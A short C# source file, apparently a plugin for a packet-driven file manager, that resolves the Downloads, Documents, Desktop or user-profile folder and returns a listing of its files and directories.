using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class Shorcuts
    {
        internal static Dictionary<ushort, List<object[]>> ShortcutsWrapper(ShortCutFileManagersPacket.ShortCuts shortCuts, ref string path) 
        {
            IntPtr strPath = new IntPtr();
            switch (shortCuts) 
            {
                case ShortCutFileManagersPacket.ShortCuts.DOWNLOADS:
                    Imports.SHGetKnownFolderPath(new Guid(Imports.FOLDERID_Downloads), 0, IntPtr.Zero, out strPath);
                    path = Marshal.PtrToStringAuto(strPath) + "\\";
                    break;

                case ShortCutFileManagersPacket.ShortCuts.DOCUMENTS:
                    path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\";
                    break;

                case ShortCutFileManagersPacket.ShortCuts.DESKTOP:
                    path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
                    break;

                case ShortCutFileManagersPacket.ShortCuts.USER_PROFILE:
                    Imports.SHGetKnownFolderPath(new Guid(Imports.FOLDERID_Profile), 0, IntPtr.Zero, out strPath);
                    path = Marshal.PtrToStringAuto(strPath) + "\\";
                    break;
            }
            return GetFilesAndDirs.GetAllFilesAndDirs(path);
        }
    }
}
